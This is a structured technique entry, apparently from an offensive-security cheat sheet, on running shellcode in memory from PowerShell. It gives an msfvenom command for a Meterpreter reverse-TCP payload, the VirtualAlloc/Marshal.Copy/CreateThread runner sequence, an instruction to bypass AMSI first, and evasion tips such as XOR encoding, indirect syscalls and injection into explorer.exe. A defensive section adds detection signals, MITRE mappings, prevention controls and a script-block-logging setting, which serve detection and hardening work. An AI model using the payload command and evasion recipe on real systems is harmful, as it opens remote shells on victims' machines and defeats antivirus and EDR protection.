name: PowerShell In-Memory Shellcode Runner
command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=443 -f ps1 -o sc.ps1
description: Executes raw shellcode entirely in memory from PowerShell so nothing malicious is written to disk for on-disk AV to scan. The runner allocates RWX memory with VirtualAlloc, copies the shellcode in, and starts it with CreateThread via Add-Type / P-Invoke. Combined with an AMSI bypass, this slips past both signature and runtime script scanning.

Runner flow (P-Invoke Win32 APIs)
examples.command: # Add-Type imports VirtualAlloc / CreateThread / WaitForSingleObject, then: allocate RWX -> Marshal.Copy shellcode -> CreateThread(addr) -> WaitForSingleObject

examples.label: Run AMSI bypass first, then the runner (same session)

notes: Order matters: bypass AMSI in the session first, or Defender scans the runner script as it loads. msfvenom -f ps1 gives the shellcode byte array; wrap it in a runner that P-Invokes VirtualAlloc (0x1000 MEM_COMMIT, 0x40 PAGE_EXECUTE_READWRITE), Marshal.Copy the bytes in, CreateThread to the address, then WaitForSingleObject to keep the process alive. Because the payload lives only in memory, on-disk scanning never sees it - but behavioral detection can still flag the RWX alloc + thread, so pair with a clean process and minimal footprint. A staged payload keeps the on-disk/first-stage tiny. Prefer x64 shellcode in a 64-bit PowerShell. Also covered in: OSCP PEN-200 Chapter 14 (Antivirus Evasion).

recommended.note: Neutralise AMSI before the runner script loads.
Compiled C# injection into a remote process instead of PowerShell.

defense.why_it_works: PowerShell can allocate executable memory (VirtualAlloc), copy shellcode bytes into it (Marshal.Copy), and execute it (CreateThread or via a delegate callback). This in-memory execution never touches disk — avoiding file-based AV scanning. The shellcode (typically Meterpreter or a custom C2 beacon) runs within the PowerShell process, making EDR detection dependent on behavioral and memory scanning rather than file scanning.
defense.prerequisites: PowerShell execution. AMSI bypass applied first (otherwise the shellcode bytes are scanned in-memory by AMSI before execution). WinAPI calls available (full language mode or via add-type). Shellcode from msfvenom or custom C2.
defense.impact: T1620 Reflective Code Loading + T1059.001 PowerShell. Executes arbitrary shellcode in-memory within PowerShell process. Provides a Meterpreter/C2 session without writing any payload to disk. Evades file-based and many signature-based AV products.
defense.detection:
AMSI: scans the shellcode bytes before execution (caught if AMSI not bypassed). ETW: PowerShell provider logs VirtualAlloc + CreateThread from PowerShell script. EDR: process injection pattern from PowerShell (API calls: VirtualAlloc → WriteProcessMemory → CreateThread is a classic shellcode injection sequence). Memory scan: shellcode in PowerShell process memory. Defender: 'PowerShell Shellcode Injection' behavioral alert.
Anomalous memory allocation and execution within the same process (VirtualAlloc → memcpy → VirtualProtect → CreateThread); unlike process injection, all activity occurs within the process own PID context (DET0300/AN0838).
In-process mmap + mprotect + execve/execveat where permissions change from writable to executable without a corresponding ELF on disk (AN0839).
Suspicious dlopen(), dlsym(), or mmap with RWX flags in processes that do not normally perform dynamic module loading; anonymous memory regions executed by user processes (AN0840).
defense.artifacts: AMSI block if not bypassed | ETW: VirtualAlloc+CreateThread in PowerShell script context | EDR alert: shellcode injection from PowerShell | Memory scan: MZ header or shellcode patterns in PS process memory | Network: C2 beacon from powershell.exe
defense.prevention:
AMSI (catches shellcode bytes before execution). EDR with memory scanning (detects post-execution). CLM (prevents add-type and direct WinAPI calls). PowerShell SBL + ETW for detection. Network detection: C2 traffic from PowerShell is anomalous in most environments.
This technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features.
Antivirus/Antimalware: Auto-quarantine of malicious scripting interpreter activity.
Audit: Inventory interpreter usage to detect unexpected scripting binaries.
Behavior Prevention on Endpoint: Windows 10 ASR rules blocking VBScript and JScript execution.
Code Signing: Permit only signed scripts; block unsigned interpreter executions.
Disable or Remove Feature or Program: Remove unused shells and scripting interpreters.
Execution Prevention: Application control (WDAC/AppLocker); PowerShell Constrained Language Mode (restrict Add-Type).
Privileged Account Management: Restrict PowerShell execution policy to admins; use PowerShell Just Enough Administration (JEA).
Restrict Web-Based Content: Script-blocking browser extensions and ad blockers.
defense.evasion: Apply AMSI bypass before injecting shellcode. Encode shellcode (XOR with random key) and decode at runtime. Use indirect syscalls instead of VirtualAlloc/CreateThread API calls. Use process injection into a different process (explorer.exe) rather than running shellcode in PowerShell itself.
defense.misconfiguration: AMSI disabled or bypassed. CLM not enforced. No ETW monitoring. EDR without memory scanning capability. PowerShell outbound network not monitored.
defense.vulnerable_config:
# No CLM:
$ExecutionContext.SessionState.LanguageMode  # FullLanguage
# → Add-Type with unsafe code compiles WinAPI calls
# → [System.Runtime.InteropServices.Marshal]::Copy() works to write shellcode

# AMSI bypassed before runner executes:
# amsiInitFailed = True → no AMSI scan of shellcode bytes
defense.secure_config:
# CLM via WDAC prevents WinAPI calls from PS:
# AllowMicrosoft base policy → PowerShell restricted to CLM
# → [System.Runtime.InteropServices.Marshal] unavailable

# Enable Script Block Logging (captures shellcode bytes before execution):
Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1

# Network rule: alert on powershell.exe making outbound connections to non-corporate IPs:
# Sysmon Event 3: Image contains powershell.exe AND DestinationIp NOT IN (corporate_ranges) → ALERT
